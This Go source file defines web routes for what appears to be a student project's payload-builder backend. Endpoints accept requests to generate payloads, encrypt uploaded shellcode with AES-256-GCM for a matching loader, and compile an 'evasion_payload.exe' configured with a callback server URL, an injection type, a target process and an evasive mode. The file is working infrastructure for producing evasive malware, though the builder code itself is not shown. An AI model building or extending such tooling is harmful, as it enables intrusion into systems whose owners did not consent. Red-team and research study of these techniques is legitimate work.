package routes

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/base64"
	"io"
	"net/http"
	"path/filepath"
	"proyecto_grado/builder"
	"proyecto_grado/controllers"
	"proyecto_grado/models"
	"proyecto_grado/services"

	"github.com/gin-gonic/gin"
)

func RegisterRoutes(r *gin.Engine) {
	r.POST("/generar", generarPayloadHandler)
	r.POST("/generar-evasion", generarEvasionHandler)
	r.POST("/cifrar-shellcode", cifrarShellcodeHandler)
}
func RegisterScreenshotRoutes(r *gin.Engine) {
	r.POST("/screenshot", controllers.ScreenshotHandler)

	r.Static("/tmp", "./tmp")
}

func RegisterPingRoutes(r *gin.Engine) {
	r.POST("/ping", controllers.PingHandler)
}
func generarPayloadHandler(c *gin.Context) {
	var req models.PayloadRequest
	if err := c.BindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "JSON inválido"})
		return
	}

	output, err := services.GeneratePayload(&req)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{
			"error":   "Error generando payload",
			"detalle": err.Error(),
		})
		return
	}

	c.Header("Content-Disposition", "attachment; filename="+filepath.Base(output))
	c.Header("Content-Type", "application/octet-stream")
	c.File(output)
}

func cifrarShellcodeHandler(c *gin.Context) {
	file, err := c.FormFile("shellcode")
	if err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "No se recibió archivo shellcode"})
		return
	}

	encKeyB64 := c.PostForm("encryption_key")
	if encKeyB64 == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Clave de cifrado requerida"})
		return
	}

	key, err := base64.StdEncoding.DecodeString(encKeyB64)
	if err != nil || len(key) != 32 {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Clave base64 inválida (debe ser AES-256, 32 bytes)"})
		return
	}

	f, err := file.Open()
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Error abriendo archivo"})
		return
	}
	defer f.Close()

	plaintext, err := io.ReadAll(f)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Error leyendo shellcode"})
		return
	}

	block, err := aes.NewCipher(key)
	if err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Error creando cipher: " + err.Error()})
		return
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Error creando GCM"})
		return
	}

	nonce := make([]byte, gcm.NonceSize())
	if _, err = io.ReadFull(rand.Reader, nonce); err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Error generando nonce"})
		return
	}

	// Formato: nonce || ciphertext (compatible con decrypt() del loader)
	encrypted := gcm.Seal(nonce, nonce, plaintext, nil)

	c.Header("Content-Disposition", "attachment; filename=shell_encrypted.bin")
	c.Header("Content-Type", "application/octet-stream")
	c.Data(http.StatusOK, "application/octet-stream", encrypted)
}

func generarEvasionHandler(c *gin.Context) {
	var req models.EvasionRequest
	if err := c.BindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "JSON inválido"})
		return
	}

	output := filepath.Join("..", "bin", "evasion_payload.exe")
	err := builder.BuildEvasion(
		output,
		req.EncryptionKey,
		req.ServerURL,
		req.InjectionType,
		req.TargetProcess,
		req.EvasiveMode,
	)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{
			"error":   "Error generando evasion payload",
			"detalle": err.Error(),
		})
		return
	}

	c.Header("Content-Disposition", "attachment; filename=evasion_payload.exe")
	c.Header("Content-Type", "application/octet-stream")
	c.File(output)
}
